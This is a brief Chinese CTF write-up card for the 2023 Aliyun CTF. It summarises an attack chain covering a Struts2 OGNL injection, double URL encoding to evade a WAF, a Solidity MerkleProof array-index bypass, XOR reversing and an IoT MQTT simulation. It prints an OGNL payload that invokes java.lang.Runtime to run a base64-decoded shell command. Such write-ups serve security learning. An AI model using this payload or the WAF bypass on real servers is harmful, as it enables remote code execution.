---
title: "2023 阿里云 CTF writeup by Mini-Venom"
category: web
tags: ["阿里云CTF", "web", "Struts2 OGNL", "双重URL编码", "Solidity MerkleProof", "偏移绕过"]
signals: ["阿里云CTF 2023", "Struts2 OGNL", "双重URL编码", "Solidity MerkleProof", "偏移绕过", "IoT linkkit MQTT", "异或差分逆向", "web_unknown", "ssti", "crypto_unknown", "pwn_unknown", "Struts2", "OGNL", "URL"]
difficulty: medium
source: "https://www.ctfiot.com/112439.html"
tools: ["C", "Python", "Solidity"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2023 阿里云 CTF writeup by Mini-Venom

> 赛事：阿里云CTF 2023 | 方向：web | 难度：medium | 工具：C、Python、Solidity

## 一句话总结

Struts2 OGNL 双重 URL 编码 + Solidity MerkleProof 数组错配 + IoT 模拟器 + 异或差分逆 C。

## 攻击链

1. OGNL 表达式 #a.getClass().forName("java.lang.Runtime") 反射执行 → 双重 URL 编码绕 WAF → Solidity MerkleProof 合约 proofs[i] 数组下标错误 → 提交 proof[i]=i 而非按叶子节点配对 → 异或差分循环解 flag → aliyun-iot-linkkit python SDK 模拟 IoT 设备连 MQTT

## 关键 payload

```
(#r="a".getClass().forName("java.lang.Runtime")).(#m=#r.getDeclaredMethods().{^ #this.name.equals("getRuntime")}[0]).(#o=#m.invoke(null,null)).(#e=#r.getDeclaredMethods().{? ...}.{? ...}[0]).(#e.invoke(#o,new String[]{"sh","-c","echo ...|base64 -d|bash"}))" 双重 URL 编码
```

## 经验教训

Solidity MerkleProof 验证时 array.length 检查不严时可手动配错位绕过；OGNL 表达式 WAF 需双重 URL 编码。

## 标签

Struts2 OGNL、双重URL编码、Solidity MerkleProof、偏移绕过、IoT linkkit MQTT、异或差分逆向

## 参考来源

- https://www.ctfiot.com/112439.html
- 原文件：2023阿里云CTF_writeup_by_Mini-Venom.full.md
